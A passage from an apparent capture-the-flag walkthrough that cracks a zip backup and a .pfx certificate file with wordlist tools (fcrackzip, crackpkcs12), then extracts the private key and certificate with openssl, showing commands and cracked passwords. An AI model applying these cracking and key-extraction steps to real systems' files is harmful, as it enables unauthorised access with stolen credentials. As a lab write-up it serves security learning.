Use fcrackzip to get the password for the zip file -> it contains a .pfx file
```bash
$ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip                                                                          130 ⨯
found file 'legacyy_dev_auth.pfx', (size cp/uc   2405/  2555, flags 9, chk 72aa)
checking pw udei9Qui                                

PASSWORD FOUND!!!!: pw == supremelegacy
```
Also note that the zip file is 'winrm_backup' -> windows remote backup?
Crack the password for the .pfx using tool found @ https://github.com/crackpkcs12/crackpkcs12
```bash
$ crackpkcs12 -b -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx 

Dictionary attack - Starting 4 threads


*********************************************************
Dictionary attack - Thread 1 - Password found: thuglegacy
*********************************************************
```
Use the password to extract the keys from the .pfx file
```bash
# Exctract priv key
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out example.key                                                                                  1 ⨯
Enter Import Password: thuglegacy
Enter PEM pass phrase: password
Verifying - Enter PEM pass phrase: password

# This new priv key's password is password
$ ls
example.key

# Now extract cert
$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out example.cert 
Enter Import Password: thuglegacy

$ ls
example.cert example.key
```